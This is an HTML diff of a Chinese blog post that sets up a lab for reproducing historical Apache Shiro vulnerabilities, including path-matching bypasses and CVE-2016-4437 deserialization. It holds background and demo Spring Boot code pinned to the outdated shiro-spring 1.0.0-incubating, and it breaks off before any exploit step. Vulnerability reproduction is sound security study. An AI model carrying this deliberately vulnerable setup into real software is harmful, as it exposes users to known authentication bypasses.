@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Apache Shiro 部分历史漏洞复现</title>
+    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta name="keywords" content='Web'>
+
+    <meta property="og:url" content="https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Apache Shiro 部分历史漏洞复现">
+    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="og:image" content="/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Apache Shiro 部分历史漏洞复现">
+    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <meta name="twitter:image" content="/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
+
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">
+
+    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://kingbridgess.github.io">
+                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/about"> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/about"> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Apache Shiro 部分历史漏洞复现</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            October 22, 2022
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h2 id="太长不看">太长不看</h2>
+<p>着手开始复现shiro历史漏洞其实是为了每周一次的web研讨，结果开始写的时候CVE-2022-40664刚刚爆出来，就正好混了一次展示。</p>
+<p>本文基本参考素十八师傅的专题 <a href="https://su18.org/post/shiro-5/">从 CVE 学 Shiro 安全</a>的思路，加之我对其的一些粗浅理解。</p>
+<p>我选择了一些shiro种比较有代表性的漏洞：如CVE-2021-3863可以看作是路径处理过程中产生问题导致的绕过的代表，而CVE-2016-4437则是大名鼎鼎的shiro反序列化。其他的历史漏洞大可以拜读素十八师傅的专题文章，这里就不再复现。</p>
+<h2 id="shiro-简介">shiro 简介</h2>
+<p>见 <a href="https://www.infoq.com/articles/apache-shiro/">https://www.infoq.com/articles/apache-shiro/</a></p>
+<p>主要需要了解 Subject, SecurityManager, and Realms 这三个概念</p>
+<h2 id="servlet-filter">Servlet Filter</h2>
+<p>See <a href="https://tomcat.apache.org/tomcat-5.5-doc/servletapi/index.html">https://tomcat.apache.org/tomcat-5.5-doc/servletapi/index.html</a></p>
+<ul>
+<li>public interface <strong>Filter</strong></li>
+</ul>
+<p>A filter is an object that performs filtering tasks on either the request to a resource (a servlet or static content), or on the response from a resource, or both.</p>
+<p>Filters perform filtering in the <code>doFilter</code> method. Every Filter has access to a FilterConfig object from which it can obtain its initialization parameters, a reference to the ServletContext which it can use, for example, to load resources needed for filtering tasks.</p>
+<p>Filters are configured in the deployment descriptor of a web application</p>
+<h2 id="基本使用">基本使用</h2>
+<h3 id="web-ini-configuration">Web INI configuration</h3>
+<p>See reference</p>
+<p><a href="https://shiro.apache.org/web.html#Web%20INI%20configuration">https://shiro.apache.org/web.html#Web%20INI%20configuration</a></p>
+<p><a href="https://shiro.apache.org/configuration.html">https://shiro.apache.org/configuration.html</a></p>
+<p>其中 URL Path Expressions 的规则如下：</p>
+<blockquote>
+<p>The mapping matches URLs using the following rules:</p>
+<ul>
+<li><code>?</code> matches one character</li>
+<li><code>*</code> matches zero or more characters</li>
+<li><code>**</code> matches zero or more &lsquo;directories&rsquo; in a path</li>
+<li><code>{spring:[a-z]+}</code> matches the regexp <code>[a-z]+</code> as a path variable named &ldquo;spring&rdquo;</li>
+</ul>
+<p>Some examples:</p>
+<ul>
+<li><code>com/t?st.jsp</code> - matches com/test.jsp but also <code>com/tast.jsp</code> or <code>com/txst.jsp</code></li>
+<li><code>com/*.jsp</code> - matches all <code>.jsp</code> files in the <code>com</code> directory</li>
+<li><code>com/**/test.jsp</code> - matches all <code>test.jsp</code> files underneath the <code>com</code> path</li>
+<li><code>org/springframework/**/*.jsp</code> - matches all <code>.jsp</code> files underneath the <code>org/springframework path</code></li>
+<li><code>org/**/servlet/bla.jsp</code> - matches <code>org/springframework/servlet/bla.jsp</code> but also <code>org/springframework/testing/servlet/bla.jsp</code> and <code>org/servlet/bla.jsp</code></li>
+<li><code>com/{filename:\\w+}.jsp</code> will match <code>com/test.jsp</code> and assign the value <code>test</code> to the <code>filename</code> variable</li>
+</ul>
+</blockquote>
+<p>特别注意，urls 的顺序会决定 filter 的选择</p>
+<blockquote>
+<p>Order Matters!</p>
+<p>URL path expressions are evaluated against an incoming request in the order they are defined and the <em>FIRST MATCH WINS</em>. For example, let’s asume that there are the following chain definitions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#50fa7b">/account/**</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">ssl, authc</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">/account/signup</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">anon</span>
+</span></span></code></pre></div><p>Always remember to define your filter chains based on a <em>FIRST MATCH WINS</em> policy!</p>
+</blockquote>
+<h3 id="demo">Demo</h3>
+<p>实现一个功能，只有 admin 用户才能访问 <code>secret.html</code> ，guest 用户访问其页面会重定位到 <code>/login</code> ，然后登录成功获取 session 即可访问 <code>secret.html</code></p>
+<p>目录结构</p>
+<p><img src="https://s2.loli.net/2022/10/22/tCwHs8B1gyVJzUT.png" alt="image-20221017170827929"></p>
+<p>其中，ShiroConfig 用于依赖注入 Shiro 的配置，UserServiceImpl 用于检验 Shiro 配置下的密码是否正确</p>
+<p>pom 依赖</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;project</span> <span style="color:#50fa7b">xmlns=</span><span style="color:#f1fa8c">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#50fa7b">xsi:schemaLocation=</span><span style="color:#f1fa8c">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;modelVersion&gt;</span>4.0.0<span style="color:#ff79c6">&lt;/modelVersion&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;parent&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter-parent<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&lt;version&gt;</span>2.7.4<span style="color:#ff79c6">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;relativePath/&gt;</span> <span style="color:#6272a4">&lt;!-- lookup parent from repository --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/parent&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;groupId&gt;</span>com.example<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring_demo<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;version&gt;</span>0.0.1-SNAPSHOT<span style="color:#ff79c6">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;name&gt;</span>spring_demo<span style="color:#ff79c6">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;description&gt;</span>spring_demo<span style="color:#ff79c6">&lt;/description&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;properties&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;java.version&gt;</span>1.8<span style="color:#ff79c6">&lt;/java.version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/properties&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependencies&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter-test<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;scope&gt;</span>test<span style="color:#ff79c6">&lt;/scope&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter-web<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>RELEASE<span style="color:#ff79c6">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;scope&gt;</span>compile<span style="color:#ff79c6">&lt;/scope&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.apache.shiro<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>shiro-spring<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>1.0.0-incubating<span style="color:#ff79c6">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependencies&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;build&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugins&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;plugin&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-maven-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/plugin&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugins&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/build&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/project&gt;</span>
+</span></span></code></pre></div><p>shiro.ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#ff79c6">[users]</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">user</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">user,user_role</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">admin</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">admin,admin_role</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[roles]</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">admin_role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">user</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">use</span>
+</span></span></code></pre></div><p>HelloController</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.spring_demo.controller<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.example.spring_demo.Service.UserServiceImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.example.spring_demo.domain.MyUser<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.beans.factory.annotation.Autowired<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.GetMapping<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.PostMapping<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.RequestBody<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.RestController<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@RestController
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">HelloController</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    @Autowired
+</span></span><span style="display:flex;"><span>    UserServiceImpl userService<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    MyUser user<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @GetMapping<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/index&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">index</span><span style="color:#ff79c6">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;hello, guest!&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    @GetMapping<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/secret&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">secret</span><span style="color:#ff79c6">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;This is my secret.&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    @PostMapping<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/login&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">admin</span><span style="color:#ff79c6">(</span>@RequestBody MyUser user<span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            userService<span style="color:#ff79c6">.</span><span style="color:#50fa7b">checkLogin</span><span style="color:#ff79c6">(</span>user<span style="color:#ff79c6">.</span><span style="color:#50fa7b">username</span><span style="color:#ff79c6">,</span>user<span style="color:#ff79c6">.</span><span style="color:#50fa7b">password</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;Login success!&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;error&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>ShiroConfig</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.spring_demo.config<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.realm.text.IniRealm<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.context.annotation.Bean<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.context.annotation.Configuration<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@Configuration
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">ShiroConfig</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    @Bean
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> IniRealm <span style="color:#50fa7b">getIniRealm</span><span style="color:#ff79c6">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> IniRealm<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;classpath:shiro.ini&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Bean
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> DefaultWebSecurityManager <span style="color:#50fa7b">getDefaultWebSecurityManager</span><span style="color:#ff79c6">(</span>IniRealm iniRealm<span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>        DefaultWebSecurityManager securityManager <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> DefaultWebSecurityManager<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        securityManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setRealm</span><span style="color:#ff79c6">(</span>iniRealm<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> securityManager<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    @Bean<span style="color:#ff79c6">(</span>name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;shiroFilterFactoryBean&#34;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> ShiroFilterFactoryBean <span style="color:#50fa7b">getShiroFilterFactoryBean</span><span style="color:#ff79c6">(</span>DefaultWebSecurityManager defaultWebSecurityManager<span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>        ShiroFilterFactoryBean filter <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ShiroFilterFactoryBean<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        filter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setSecurityManager</span><span style="color:#ff79c6">(</span>defaultWebSecurityManager<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Map<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">,</span>String<span style="color:#ff79c6">&gt;</span> filterMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 设置拦截器，设置权限
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        filterMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/secret.html/**&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;authc,roles[admin_role]&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        filterMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/secret/**&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;authc,roles[admin_role]&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        filterMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/**&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;anon&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        filter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFilterChainDefinitionMap</span><span style="color:#ff79c6">(</span>filterMap<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 设置默认登录界面和未验证页面跳转
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        filter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setLoginUrl</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/login&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        filter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setUnauthorizedUrl</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/hello&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> filter<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>UserServiceImpl</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.spring_demo.Service<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.SecurityUtils<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.authc.UsernamePasswordToken<span style="color:#ff79c6">;</span>
